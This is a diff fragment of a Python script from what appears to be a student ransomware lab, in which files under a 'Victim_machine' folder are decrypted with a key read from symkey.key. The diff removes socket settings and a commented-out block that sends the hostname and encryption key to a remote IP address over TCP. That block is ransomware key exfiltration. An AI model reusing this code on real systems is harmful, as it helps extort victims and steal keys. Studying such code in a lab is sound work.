@@ -18,23 +18,12 @@ for root, dirs, file in os.walk('/media/sf_Ransomware_Group8/Action/Victim_machi
 
 print(files)
 
-#Socket information
-IP_ADDRESS = '172.17.0.1'
-PORT = 68
-hostname = socket.gethostname()
-
-
+#Reading the key from symkey.key
 with open("/media/sf_Ransomware_Group8/Action/Victim_machine/Imp/symkey.key", "rb") as thekey:
 	secret_key= thekey.read()
 print(secret_key)
 
-#Connect to server to transfer key and hostname
-#with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-#	s.connect((IP_ADDRESS, PORT))
-#	print('Successfully connected...transmitting hostname and key')
-#	s.send(f'{hostname} : {key}'.encode('utf-8'))
-#	print('Finished transmitting data!!!')
-#	s.close()
+#Reading each file to decrypt using the key from symkey.key file
 
 for file in files:
 	with open(file, "rb") as thefile:
